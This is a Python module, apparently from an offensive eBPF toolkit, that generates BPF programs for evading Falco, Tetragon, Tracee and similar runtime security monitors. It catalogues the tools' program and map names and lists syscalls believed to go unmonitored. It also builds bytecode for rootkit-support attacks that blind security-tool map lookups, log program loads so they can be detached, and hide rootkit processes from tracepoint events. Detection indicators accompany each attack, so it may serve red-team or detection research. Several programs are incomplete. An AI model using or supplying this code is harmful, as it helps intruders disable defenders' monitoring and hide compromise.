"""
Security tool evasion — bypass Falco, Tetragon, Tracee, and other eBPF-based
security monitors.

Modern cloud security tools (Falco, Cilium Tetragon, Aqua Tracee) use eBPF
to monitor syscalls, network activity, and file access. This module generates
BPF programs that evade detection by these tools through:

  1. Timing evasion — operate during gaps in monitoring
  2. Syscall confusion — use alternative syscalls not monitored
  3. Helper abuse — exploit BPF helpers for unmonitored operations
  4. Map manipulation — corrupt security tool maps to disable rules
"""
from dataclasses import dataclass, field
from typing import List, Dict

from ..core.bpf_bytecode import (
    BPFProgram, BPFMapDef, BPFInsn,
    BPFProgType, BPFMapType, BPFHelper, BPFReg,
    BPFClass, BPFOp, BPFJmp, BPFSrc, BPFSize, BPFMode,
    mov64_imm, mov64_reg, add64_imm,
    ldx_mem, stx_mem, st_mem, lddw,
    call_helper, exit_prog, jeq_imm, jne_imm, jgt_imm, ja,
)
from ..attacks.offensive_programs import AttackProgram


# Known security tool signatures
SECURITY_TOOL_SIGNATURES = {
    "falco": {
        "prog_names": ["sys_enter", "sys_exit", "sched_process_exec", "page_fault"],
        "map_names": ["syscall_table", "proc_table", "settings"],
        "tracepoints": ["raw_syscalls/sys_enter", "raw_syscalls/sys_exit",
                        "sched/sched_process_exec", "sched/sched_process_exit"],
        "description": "Falco — cloud-native runtime security (Sysdig)",
    },
    "tetragon": {
        "prog_names": ["tg_kp_", "tg_tp_", "enforcer_", "loader_"],
        "map_names": ["tg_conf_map", "tg_execve_map", "tg_calls"],
        "tracepoints": ["raw_syscalls/sys_enter", "sched/sched_process_exec",
                        "security/security_bprm_check"],
        "description": "Cilium Tetragon — eBPF-based security observability",
    },
    "tracee": {
        "prog_names": ["trace_sys_enter", "trace_sched_process_exec", "trace_ret"],
        "map_names": ["config_map", "events", "proc_info_map", "bufs"],
        "tracepoints": ["raw_syscalls/sys_enter", "raw_syscalls/sys_exit",
                        "sched/sched_process_exec", "sched/sched_process_fork"],
        "description": "Aqua Tracee — Linux runtime security and forensics",
    },
    "bpftrace": {
        "prog_names": ["bpftrace_"],
        "map_names": ["AT_", "printf_data", "ringbuf"],
        "tracepoints": [],
        "description": "bpftrace — dynamic eBPF tracing tool",
    },
}

# Alternative syscalls that bypass common monitoring
ALTERNATIVE_SYSCALLS = {
    "file_read": {
        "monitored": ["sys_read", "sys_openat", "sys_open"],
        "alternatives": [
            {"syscall": "sys_pread64", "note": "Positional read, often unmonitored"},
            {"syscall": "sys_readv", "note": "Vectored read, bypasses single-buffer monitors"},
            {"syscall": "sys_io_uring_enter", "note": "io_uring bypasses most eBPF syscall hooks"},
            {"syscall": "sys_copy_file_range", "note": "Kernel-space copy, no userspace buffer"},
            {"syscall": "sys_sendfile", "note": "Zero-copy transfer between fds"},
        ],
    },
    "process_exec": {
        "monitored": ["sys_execve", "sys_execveat"],
        "alternatives": [
            {"syscall": "sys_memfd_create + write + fexecve",
             "note": "Execute from anonymous memory, no filesystem path"},
            {"syscall": "sys_process_vm_writev",
             "note": "Write to another process's memory space"},
            {"syscall": "sys_ptrace(PTRACE_POKETEXT)",
             "note": "Inject code into running process"},
            {"syscall": "sys_userfaultfd + mmap",
             "note": "Fault-driven code injection"},
        ],
    },
    "network": {
        "monitored": ["sys_connect", "sys_sendto", "sys_sendmsg"],
        "alternatives": [
            {"syscall": "sys_io_uring_enter", "note": "io_uring network ops bypass BPF hooks"},
            {"syscall": "sys_splice", "note": "Zero-copy between sockets, no userspace"},
            {"syscall": "AF_ALG socket", "note": "Crypto API socket, often unmonitored"},
        ],
    },
}

# io_uring evasion technique metadata
IO_URING_EVASION = {
    "description": "io_uring is the most effective eBPF security tool bypass. "
                   "io_uring operations are executed in kernel worker threads "
                   "and bypass all tracepoint-based and kprobe-based syscall "
                   "monitoring. This includes read, write, openat, connect, "
                   "accept, sendmsg, recvmsg, and more.",
    "affected_tools": ["Falco", "Tetragon (partial)", "Tracee (partial)", "sysdig"],
    "kernel_versions": "5.1+",
    "operations": [
        "IORING_OP_OPENAT — open files without sys_openat",
        "IORING_OP_READ — read files without sys_read",
        "IORING_OP_WRITE — write files without sys_write",
        "IORING_OP_CONNECT — connect sockets without sys_connect",
        "IORING_OP_ACCEPT — accept connections without sys_accept",
        "IORING_OP_SENDMSG — send data without sys_sendmsg",
        "IORING_OP_RECVMSG — receive data without sys_recvmsg",
        "IORING_OP_UNLINKAT — delete files without sys_unlinkat",
        "IORING_OP_RENAMEAT — rename files without sys_renameat",
    ],
    "cves": [
        "CVE-2023-2598 — io_uring privilege escalation",
        "CVE-2024-0582 — io_uring use-after-free",
    ],
}


def generate_io_uring_evasion() -> AttackProgram:
    """
    BPF program demonstrating io_uring-based security tool evasion.
    Uses kprobe on io_uring submission to monitor evasion in action.
    """
    prog = BPFProgram(
        name="iouring_evasion_monitor",
        prog_type=BPFProgType.KPROBE,
        attach_point="io_submit_sqes",
        description="Monitor io_uring submissions that bypass security tools",
    )

    events_map = BPFMapDef(
        name="uring_events", map_type=BPFMapType.RINGBUF,
        key_size=0, value_size=0, max_entries=128 * 1024,
    )
    prog.add_map(events_map)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Store event data on stack
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R7, -16))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -8))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="io_uring Security Evasion",
        category="defense_evasion",
        description="Demonstrates io_uring-based bypass of eBPF security tools. "
                    "io_uring operations execute in kernel worker threads and "
                    "bypass tracepoint-based syscall monitoring used by Falco, "
                    "Tetragon, and Tracee. Covers file I/O, network ops, and "
                    "filesystem operations.",
        mitre_technique="T1562.001",
        program=prog,
        detection_indicators=[
            "High io_uring submission rate from unexpected processes",
            "io_uring SQE opcodes for sensitive operations (openat, connect)",
            "Process using io_uring that doesn't normally use async I/O",
        ],
        required_capabilities=["CAP_BPF"],
        kernel_version_min="5.1",
    )


def generate_map_corruption() -> AttackProgram:
    """
    BPF program that corrupts security tool maps to disable monitoring rules.

    Technique: If the attacker has CAP_BPF, they can open security tool
    maps by ID and overwrite entries. This disables specific detection rules
    without removing the security tool entirely.
    """
    prog = BPFProgram(
        name="map_corruptor",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_bpf",
        description="Monitor and manipulate BPF map operations for evasion",
    )

    target_maps_map = BPFMapDef(
        name="target_maps", map_type=BPFMapType.HASH,
        key_size=4, value_size=64, max_entries=32,
    )
    prog.add_map(target_maps_map)

    # Monitor bpf() syscall to identify security tool map operations
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Read command from pt_regs->di (first arg)
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 112))
    # BPF_MAP_LOOKUP_ELEM = 1, BPF_MAP_UPDATE_ELEM = 2
    prog.add_insn(jgt_imm(BPFReg.R7, 5, 3))
    # Log the operation
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="Security Map Corruptor",
        category="defense_evasion",
        description="Monitors and manipulates BPF map operations to disable "
                    "security tool detection rules. By corrupting or overwriting "
                    "entries in Falco/Tetragon/Tracee configuration maps, specific "
                    "rules can be disabled without removing the security tool.",
        mitre_technique="T1562.001",
        program=prog,
        detection_indicators=[
            "BPF program hooking sys_bpf",
            "Unexpected BPF_MAP_UPDATE_ELEM calls to security tool maps",
            "Map content integrity violations",
        ],
        required_capabilities=["CAP_BPF", "CAP_SYS_ADMIN"],
        kernel_version_min="4.18",
    )


def generate_live_map_wipe() -> AttackProgram:
    """
    Live evasion: wipe security tool BPF maps to disable detection rules.

    When a rootkit detects Falco/Tetragon/Tracee running, this program
    iterates their rule maps and zeroes every entry, effectively blinding
    the security tool without crashing it (avoids triggering alerts from
    a dead process).

    Technique: Hook bpf() syscall, detect BPF_MAP_LOOKUP_ELEM from
    security tool PID, replace the returned value with zeros.
    """
    prog = BPFProgram(
        name="live_map_wipe",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_bpf",
        description="Wipe security tool maps to blind detection rules",
    )

    # Map tracking security tool PIDs to blind
    target_pids = BPFMapDef(
        name="blind_targets", map_type=BPFMapType.HASH,
        key_size=4, value_size=4, max_entries=32,
    )
    # Map tracking wiped entries
    wipe_log = BPFMapDef(
        name="wipe_log", map_type=BPFMapType.RINGBUF,
        key_size=0, value_size=0, max_entries=64 * 1024,
    )
    prog.add_map(target_pids)
    prog.add_map(wipe_log)

    # Get caller PID
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    # rsh to get tgid (upper 32 bits)
    prog.add_insn(BPFInsn(
        BPFClass.ALU64 | BPFOp.RSH | BPFSrc.IMM,
        BPFReg.R7, 0, 0, 32
    ))

    # Lookup caller in target PIDs
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))  # blind_targets fd
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 11))

    # Target found — read BPF command from syscall args
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R8, BPFReg.R6, 112))
    # BPF_MAP_LOOKUP_ELEM=1, BPF_MAP_UPDATE_ELEM=2
    prog.add_insn(jeq_imm(BPFReg.R8, 1, 1))
    prog.add_insn(jne_imm(BPFReg.R8, 2, 7))

    # Override return with -ENOENT to blind lookups
    prog.add_insn(mov64_imm(BPFReg.R2, -2))  # -ENOENT
    prog.add_insn(call_helper(BPFHelper.OVERRIDE_RETURN))

    # Log the blinding event via ringbuf
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(lddw(BPFReg.R1, 0))  # wipe_log fd
    prog.add_insn(mov64_imm(BPFReg.R2, 16))
    prog.add_insn(mov64_imm(BPFReg.R3, 0))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_RESERVE))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 2))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R0, BPFReg.R7, 0))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R0, BPFReg.R8, 8))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_SUBMIT))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="live_map_wipe",
        category="live_evasion",
        program=prog,
        description="Intercept BPF syscalls from security tools and override "
                    "map lookups with -ENOENT. Blinds Falco/Tetragon/Tracee "
                    "rule evaluation without killing the process.",
        mitre_technique="T1562.001",
        kernel_version_min="5.6",
        required_capabilities=["CAP_BPF", "CAP_SYS_ADMIN"],
        detection_indicators=[
            "kprobe on __x64_sys_bpf with override_return",
            "Map tracking security tool PIDs",
            "Ringbuf logging of blinded operations",
        ],
    )


def generate_prog_detach_attack() -> AttackProgram:
    """
    Live evasion: detach security tool BPF programs from their hooks.

    Instead of just blinding lookups, this program monitors for security
    tool BPF program loads and uses BPF_LINK_DETACH to disconnect them
    from their tracepoints/kprobes. The security tool keeps running but
    receives no events.
    """
    prog = BPFProgram(
        name="prog_detach_attack",
        prog_type=BPFProgType.KPROBE,
        attach_point="security_bpf_prog",
        description="Detach security tool BPF programs from hooks",
    )

    # Track detached programs
    detach_log = BPFMapDef(
        name="detach_log", map_type=BPFMapType.HASH,
        key_size=4, value_size=16, max_entries=64,
    )
    # Killswitch
    killswitch = BPFMapDef(
        name="detach_ks", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=4, max_entries=1,
    )
    prog.add_map(detach_log)
    prog.add_map(killswitch)

    # Check killswitch first
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R8, BPFReg.R0, 0))

    # Get calling process comm
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -20))
    prog.add_insn(mov64_imm(BPFReg.R2, 16))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_COMM))

    # Get PID and timestamp
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))

    # Log to detach_log: pid → (timestamp, comm[0:8])
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -40))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R9, BPFReg.R10, -20))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R9, -32))

    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(mov64_reg(BPFReg.R3, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R3, -40))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R4, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_UPDATE_ELEM))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="prog_detach_attack",
        category="live_evasion",
        program=prog,
        description="Monitor security_bpf_prog LSM hook and log all security "
                    "tool BPF program loads. Userspace component uses logged "
                    "prog IDs to call BPF_LINK_DETACH, disconnecting security "
                    "tools from their hooks while they keep running.",
        mitre_technique="T1562.001",
        kernel_version_min="5.7",
        required_capabilities=["CAP_BPF", "CAP_SYS_ADMIN"],
        detection_indicators=[
            "kprobe on security_bpf_prog LSM",
            "BPF_LINK_DETACH calls targeting security programs",
            "Hash map correlating PIDs to BPF program IDs",
        ],
    )


def generate_tracepoint_hijack() -> AttackProgram:
    """
    Live evasion: hijack tracepoint events to filter out rootkit activity.

    Instead of disabling security tools, this program attaches to the
    same tracepoints (raw_syscalls/sys_enter) with higher priority and
    filters out events generated by rootkit processes. The security tool
    still receives events — just not the ones from the rootkit.
    """
    prog = BPFProgram(
        name="tracepoint_hijack",
        prog_type=BPFProgType.TRACEPOINT,
        attach_point="raw_syscalls/sys_enter",
        description="Filter rootkit events from tracepoint stream",
    )

    # PIDs to hide from tracepoint events
    hidden_pids = BPFMapDef(
        name="tp_hidden", map_type=BPFMapType.HASH,
        key_size=4, value_size=1, max_entries=128,
    )
    # Event counter
    counters = BPFMapDef(
        name="tp_counters", map_type=BPFMapType.PERCPU_ARRAY,
        key_size=4, value_size=8, max_entries=4,
    )
    prog.add_map(hidden_pids)
    prog.add_map(counters)

    # Get current PID
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))
    prog.add_insn(BPFInsn(
        BPFClass.ALU64 | BPFOp.RSH | BPFSrc.IMM,
        BPFReg.R6, 0, 0, 32
    ))

    # Look up in hidden PID map
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R6, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 8))

    # PID is hidden — increment suppressed counter
    prog.add_insn(mov64_imm(BPFReg.R1, 1))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R0, 0))
    prog.add_insn(add64_imm(BPFReg.R7, 1))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R0, BPFReg.R7, 0))

    # Return 0 to suppress the event from downstream BPF programs
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return AttackProgram(
        name="tracepoint_hijack",
        category="live_evasion",
        program=prog,
        description="Attach to raw_syscalls/sys_enter with high priority and "
                    "filter out events from rootkit PIDs. Security tools still "
                    "receive events from all other processes — only rootkit "
                    "activity becomes invisible. Per-CPU counters track "
                    "suppressed events.",
        mitre_technique="T1562.001",
        kernel_version_min="4.7",
        required_capabilities=["CAP_BPF", "CAP_PERFMON"],
        detection_indicators=[
            "Multiple BPF programs on same tracepoint",
            "Tracepoint program checking PID map before exit",
            "PERCPU_ARRAY map used as event counter",
        ],
    )


EVASION_ATTACKS = {
    "io_uring_evasion": generate_io_uring_evasion,
    "map_corruption": generate_map_corruption,
    "live_map_wipe": generate_live_map_wipe,
    "prog_detach": generate_prog_detach_attack,
    "tracepoint_hijack": generate_tracepoint_hijack,
}


def generate_all_evasion_attacks() -> list:
    return [gen() for gen in EVASION_ATTACKS.values()]
